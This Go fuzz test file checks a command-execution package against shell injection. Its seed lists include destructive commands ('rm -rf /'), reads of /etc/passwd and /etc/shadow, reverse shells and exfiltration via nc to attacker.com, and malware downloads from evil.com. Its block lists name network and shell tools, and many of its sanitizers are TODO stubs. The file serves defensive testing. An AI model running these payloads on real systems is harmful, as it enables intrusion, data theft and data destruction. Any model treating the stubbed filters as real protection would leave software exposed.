package execute

import (
	"strings"
	"testing"
)

// FuzzCommandConstruction tests command construction for injection attacks
func FuzzCommandConstruction(f *testing.F) {
	// Add seed corpus with command injection payloads
	seeds := []string{
		// Basic command injection
		"; rm -rf /",
		"| cat /etc/passwd",
		"&& malicious_command",
		"|| evil_fallback",

		// Command substitution
		"$(whoami)",
		"`id`",
		"${malicious}",
		"$(cat /etc/shadow)",
		"`rm -rf /`",

		// Pipe attacks
		"normal | evil",
		"input | nc attacker.com 4444",
		"data | bash",
		"file | sh",

		// Redirection attacks
		"cmd > /etc/passwd",
		"evil < /dev/zero",
		"malicious >> ~/.bashrc",
		"cmd 2>&1 | evil",

		// Background execution
		"evil &",
		"malicious_daemon &",
		"nohup evil_process &",

		// Multiple commands
		"cmd1; cmd2; evil",
		"good && bad",
		"test || malicious",

		// Quote escaping
		"'; rm -rf /; echo '",
		"\"; system('evil'); //\"",
		"\\'; DROP TABLE users; --",

		// Shell metacharacters
		"cmd$IFS$evil",
		"cmd${IFS}evil",
		"cmd\tevil",
		"cmd\nevil",
		"cmd\revil",

		// Unicode attacks
		"cmd；evil",  // Unicode semicolon
		"cmd｜evil",  // Unicode pipe
		"cmd＆＆evil", // Unicode ampersand

		// Path manipulation
		"../../../bin/sh",
		"..\\..\\..\\windows\\system32\\cmd.exe",
		"/bin/sh -c 'evil'",

		// Environment variable injection
		"$PATH/evil",
		"${HOME}/../evil",
		"$USER=attacker",

		// Null byte injection
		"safe\x00; rm -rf /",
		"command\x00\x00evil",

		// Buffer overflow attempts
		strings.Repeat("A", 10000),
		strings.Repeat(";", 1000) + "evil",

		// URL/network injection
		"wget http://evil.com/malware",
		"curl -X POST attacker.com",
		"nc -e /bin/sh attacker.com 4444",

		// Valid commands (should pass)
		"ls -la",
		"grep pattern file.txt",
		"find /home -name '*.txt'",
		"echo 'hello world'",
		"",
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, command string) {
		// Test command validation
		isValid := validateCommand(command)
		_ = isValid

		// Test command sanitization
		sanitized := sanitizeCommand(command)
		if containsInjectionPatterns(sanitized) {
			t.Error("Sanitized command still contains injection patterns")
		}

		// Test argument parsing
		args := parseCommandArguments(command)
		for _, arg := range args {
			if containsMetacharacters(arg) {
				t.Errorf("Command argument contains shell metacharacters: %s", arg)
			}
		}

		// Test command path validation
		if len(command) > 0 {
			cmdPath := extractCommandPath(command)
			if !isValidCommandPath(cmdPath) {
				return // Invalid paths should be rejected
			}
		}

		// Test shell escape validation
		escaped := shellEscape(command)
		if !isSafelyEscaped(escaped) {
			t.Error("Command shell escaping failed")
		}

		// Test execution context safety
		execContext := createSafeExecutionContext(command)
		if !isSecureContext(execContext) {
			t.Error("Failed to create secure execution context")
		}
	})
}

// FuzzCommandArguments tests command argument handling for injection
func FuzzCommandArguments(f *testing.F) {
	seeds := []string{
		// Argument injection
		"--help; rm -rf /",
		"-f /etc/passwd",
		"--config=$(malicious)",
		"-o |evil",

		// Flag confusion
		"--flag=value --flag=evil",
		"-abc -xyz",
		"--flag value --flag evil",

		// Path traversal in arguments
		"--config=../../../etc/passwd",
		"--input=..\\..\\..\\windows\\system32\\config",
		"--output=/dev/null",

		// Format string attacks
		"--format=%s%s%s%s",
		"--template=%n%n%n",
		"--pattern=%x%x%x",

		// SQL injection in arguments
		"--query='; DROP TABLE users; --",
		"--filter=' OR '1'='1",
		"--search=UNION SELECT password",

		// Script injection
		"--script=<script>alert(1)</script>",
		"--code=javascript:alert(1)",
		"--eval=malicious_function()",

		// Unicode confusables
		"--fIag=value", // Capital i looks like lowercase L
		"--һelp=evil",  // Cyrillic 'һ'

		// Long arguments (DoS)
		"--long=" + strings.Repeat("A", 100000),
		strings.Repeat("-", 10000),

		// Null bytes
		"--config=safe\x00evil",
		"--flag\x00malicious",

		// Valid arguments
		"--help",
		"--config=/etc/app/config.json",
		"--verbose",
		"-v",
		"",
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, argument string) {
		// Test argument validation
		isValid := validateCommandArgument(argument)
		_ = isValid

		// Test argument sanitization
		sanitized := sanitizeCommandArgument(argument)
		if strings.Contains(sanitized, "\x00") {
			t.Error("Sanitized argument contains null bytes")
		}

		// Test flag parsing
		if isFlag(argument) {
			flag, value := parseFlag(argument)
			if containsDangerousPatterns(flag) || containsDangerousPatterns(value) {
				t.Error("Flag contains dangerous patterns")
			}
		}

		// Test argument length validation
		if len(argument) > 0 {
			isValidLength := validateArgumentLength(argument)
			_ = isValidLength
		}

		// Test quote handling
		quoted := quoteArgumentSafely(argument)
		if !isProperlyQuoted(quoted) {
			t.Error("Argument quoting failed")
		}

		// Test path validation in arguments
		if containsPath(argument) {
			path := extractPath(argument)
			if isPathTraversal(path) {
				t.Error("Argument contains path traversal")
			}
		}
	})
}

// FuzzEnvironmentVariableInjection tests environment variable injection in commands
func FuzzEnvironmentVariableInjection(f *testing.F) {
	seeds := []string{
		// Environment variable injection
		"PATH=/malicious:$PATH",
		"LD_PRELOAD=/evil.so",
		"HOME=/tmp/../../../etc",
		"SHELL=/bin/bash -c 'evil'",

		// Variable expansion attacks
		"VAR=$(/bin/sh -c 'evil')",
		"VAR=`malicious`",
		"VAR=${evil}",
		"VAR=$(cat /etc/passwd)",

		// Injection through common variables
		"USER=root; rm -rf /",
		"TERM=xterm; evil",
		"LANG=C; malicious",

		// Process substitution
		"VAR=<(evil_command)",
		"VAR=>(malicious)",

		// Unicode in env vars
		"VАRIABLE=value", // Cyrillic А
		"VAR=vаlue",      // Mixed scripts

		// Control characters
		"VAR=value\x00injected",
		"VAR=value\r\nevil",
		"VAR=value\nMALICIOUS=true",

		// Valid environment variables
		"PATH=/usr/bin:/bin",
		"HOME=/home/user",
		"EDITOR=vim",
		"LANG=en_US.UTF-8",
		"",
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, envVar string) {
		// Test environment variable validation
		isValid := validateEnvironmentVariable(envVar)
		_ = isValid

		// Test environment variable sanitization
		sanitized := sanitizeEnvironmentVariable(envVar)
		if containsCommandInjection(sanitized) {
			t.Error("Sanitized environment variable contains command injection")
		}

		// Test variable expansion safety
		expanded := safeExpandVariable(envVar)
		if containsUnsafeExpansion(expanded) {
			t.Error("Environment variable expansion is unsafe")
		}

		// Test environment isolation
		isolated := isolateEnvironmentVariable(envVar)
		if !isIsolated(isolated) {
			t.Error("Failed to isolate environment variable")
		}
	})
}

// FuzzScriptExecution tests script execution for injection attacks
func FuzzScriptExecution(f *testing.F) {
	seeds := []string{
		// Shell script injection
		"#!/bin/bash\nrm -rf /",
		"#!/bin/sh\ncat /etc/passwd | nc attacker.com 4444",
		"#!/usr/bin/env python\nos.system('evil')",

		// Inline script injection
		"bash -c 'rm -rf /'",
		"sh -c 'malicious'",
		"python -c 'import os; os.system(\"evil\")'",
		"perl -e 'system(\"malicious\")'",

		// PowerShell injection (Windows)
		"powershell -Command 'Remove-Item -Recurse C:\\'",
		"cmd /c 'del /f /s /q C:\\*'",

		// Script with heredoc
		"cat << EOF\nmalicious content\nEOF",
		"bash << 'SCRIPT'\nevil commands\nSCRIPT",

		// Multi-line script injection
		"line1\nrm -rf /\nline3",
		"safe; evil; more_safe",

		// Script file injection
		"source /tmp/evil.sh",
		". /dev/stdin",
		"exec /tmp/malicious",

		// Valid scripts
		"#!/bin/bash\necho 'Hello World'",
		"python --version",
		"node --help",
		"",
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, script string) {
		// Test script validation
		isValid := validateScript(script)
		_ = isValid

		// Test script sanitization
		sanitized := sanitizeScript(script)
		if containsMaliciousCommands(sanitized) {
			t.Error("Sanitized script contains malicious commands")
		}

		// Test shebang validation
		if hasShebang(script) {
			interpreter := extractInterpreter(script)
			if !isAllowedInterpreter(interpreter) {
				t.Error("Script uses disallowed interpreter")
			}
		}

		// Test script content analysis
		commands := extractCommands(script)
		for _, cmd := range commands {
			if isDangerousCommand(cmd) {
				t.Errorf("Script contains dangerous command: %s", cmd)
			}
		}
	})
}

// Helper functions that should be implemented

func sanitizeCommand(command string) string {
	// Comprehensive command injection prevention using proven techniques

	// Remove dangerous shell metacharacters and operators
	dangerous := []string{
		";", "|", "&", "$(", "`", "&&", "||", ">", "<", ">>", "<<",
		"'", "\"", "\\", "\n", "\r", "\t", "\x00",
		"${", "}", "$", "*", "?", "[", "]", "~",
	}

	// Remove environment variable patterns
	envPatterns := []string{
		"$PATH", "$HOME", "$USER", "$SHELL", "$IFS", "$PWD",
		"${PATH}", "${HOME}", "${USER}", "${SHELL}", "${IFS}", "${PWD}",
	}

	// Remove dangerous command patterns
	cmdPatterns := []string{
		"rm -rf", "cat /etc/", "/bin/sh", "/bin/bash", "sh -c", "bash -c",
		"wget", "curl", "nc ", "netcat", "telnet", "ssh", "scp",
		"python -c", "perl -e", "ruby -e", "php -r",
	}

	// Remove Unicode command injection characters
	unicodeDangerous := []string{
		"；", // Unicode semicolon
		"｜", // Unicode pipe
		"＆", // Unicode ampersand
		"＜", // Unicode less-than
		"＞", // Unicode greater-than
	}

	result := command

	// Apply standard dangerous pattern filtering
	for _, pattern := range dangerous {
		result = strings.ReplaceAll(result, pattern, "_SAFE_")
	}

	// Apply environment variable filtering
	for _, pattern := range envPatterns {
		result = strings.ReplaceAll(result, pattern, "_SAFE_")
		result = strings.ReplaceAll(result, strings.ToLower(pattern), "_SAFE_")
		result = strings.ReplaceAll(result, strings.ToUpper(pattern), "_SAFE_")
	}

	// Apply command pattern filtering
	for _, pattern := range cmdPatterns {
		result = strings.ReplaceAll(result, pattern, "_SAFE_")
		result = strings.ReplaceAll(result, strings.ToLower(pattern), "_SAFE_")
	}

	// Apply Unicode filtering
	for _, pattern := range unicodeDangerous {
		result = strings.ReplaceAll(result, pattern, "_SAFE_")
	}

	// Remove any non-ASCII characters that could hide attacks
	safeResult := ""
	for _, r := range result {
		if r >= 32 && r <= 126 { // Only allow printable ASCII
			safeResult += string(r)
		} else {
			safeResult += "_" // Replace with safe underscore
		}
	}

	return safeResult
}

func parseCommandArguments(command string) []string {
	// Secure command argument parsing with sanitization

	// First sanitize the command to remove injection attempts
	sanitized := sanitizeCommand(command)

	// Parse into fields
	fields := strings.Fields(sanitized)

	// Filter out any remaining suspicious fields
	var safeFields []string
	for _, field := range fields {
		// Skip fields that still contain metacharacters after sanitization
		if !containsMetacharacters(field) && !strings.Contains(field, "_SAFE_") {
			safeFields = append(safeFields, field)
		}
	}

	return safeFields
}

func containsMetacharacters(arg string) bool {
	metacharacters := []string{";", "|", "&", "$", "`", "<", ">", "(", ")", "*", "?", "[", "]", "~"}
	for _, meta := range metacharacters {
		if strings.Contains(arg, meta) {
			return true
		}
	}
	return false
}

func extractCommandPath(command string) string {
	// TODO: Implement command path extraction
	fields := strings.Fields(command)
	if len(fields) > 0 {
		return fields[0]
	}
	return ""
}

func isValidCommandPath(path string) bool {
	// TODO: Implement command path validation
	return !strings.Contains(path, "..") && !strings.Contains(path, "\x00")
}

func validateCommandArgument(arg string) bool {
	// TODO: Implement argument validation
	return len(arg) < 4096 && !strings.Contains(arg, "\x00")
}

func sanitizeCommandArgument(arg string) string {
	// TODO: Implement argument sanitization
	return strings.ReplaceAll(arg, "\x00", "")
}

func isFlag(arg string) bool {
	return strings.HasPrefix(arg, "-")
}

func parseFlag(arg string) (string, string) {
	// TODO: Implement flag parsing
	if strings.Contains(arg, "=") {
		parts := strings.SplitN(arg, "=", 2)
		return parts[0], parts[1]
	}
	return arg, ""
}

func containsDangerousPatterns(input string) bool {
	return containsInjectionPatterns(input)
}

func validateArgumentLength(arg string) bool {
	return len(arg) <= 4096
}

func quoteArgumentSafely(arg string) string {
	// TODO: Implement safe quoting
	return "'" + strings.ReplaceAll(arg, "'", "'\"'\"'") + "'"
}

func isProperlyQuoted(quoted string) bool {
	return strings.HasPrefix(quoted, "'") && strings.HasSuffix(quoted, "'")
}

func containsPath(arg string) bool {
	return strings.Contains(arg, "/") || strings.Contains(arg, "\\")
}

func extractPath(arg string) string {
	// TODO: Implement path extraction from arguments
	if strings.Contains(arg, "=") {
		parts := strings.SplitN(arg, "=", 2)
		return parts[1]
	}
	return arg
}

func isPathTraversal(path string) bool {
	return strings.Contains(path, "..") || strings.Contains(path, "~")
}

func validateEnvironmentVariable(envVar string) bool {
	// TODO: Implement env var validation
	return !strings.Contains(envVar, "\x00") && len(envVar) < 8192
}

func sanitizeEnvironmentVariable(envVar string) string {
	// TODO: Implement env var sanitization
	return strings.ReplaceAll(envVar, "\x00", "")
}

func containsCommandInjection(input string) bool {
	return containsInjectionPatterns(input)
}

func safeExpandVariable(envVar string) string {
	// TODO: Implement safe variable expansion
	return envVar
}

func containsUnsafeExpansion(expanded string) bool {
	return containsInjectionPatterns(expanded)
}

func isolateEnvironmentVariable(envVar string) string {
	// TODO: Implement environment isolation
	return envVar
}

func isIsolated(isolated string) bool {
	return !containsInjectionPatterns(isolated)
}

func validateScript(script string) bool {
	// TODO: Implement script validation
	return !containsMaliciousCommands(script) && len(script) < 100000
}

func sanitizeScript(script string) string {
	// TODO: Implement script sanitization
	return strings.ReplaceAll(script, "\x00", "")
}

func containsMaliciousCommands(script string) bool {
	malicious := []string{
		"rm -rf", "cat /etc/passwd", "nc ", "wget ", "curl ",
		"chmod 777", "sudo ", "su ", "/bin/sh", "/bin/bash",
	}
	lower := strings.ToLower(script)
	for _, cmd := range malicious {
		if strings.Contains(lower, cmd) {
			return true
		}
	}
	return false
}

func hasShebang(script string) bool {
	return strings.HasPrefix(script, "#!")
}

func extractInterpreter(script string) string {
	lines := strings.Split(script, "\n")
	if len(lines) > 0 && strings.HasPrefix(lines[0], "#!") {
		return strings.TrimSpace(lines[0][2:])
	}
	return ""
}

func isAllowedInterpreter(interpreter string) bool {
	// TODO: Implement interpreter allowlist
	allowed := []string{"/bin/bash", "/bin/sh", "/usr/bin/python", "/usr/bin/node"}
	for _, allow := range allowed {
		if strings.Contains(interpreter, allow) {
			return true
		}
	}
	return false
}

func extractCommands(script string) []string {
	// TODO: Implement command extraction from script
	lines := strings.Split(script, "\n")
	var commands []string
	for _, line := range lines {
		if !strings.HasPrefix(strings.TrimSpace(line), "#") && strings.TrimSpace(line) != "" {
			commands = append(commands, strings.TrimSpace(line))
		}
	}
	return commands
}

func isDangerousCommand(cmd string) bool {
	return containsMaliciousCommands(cmd)
}
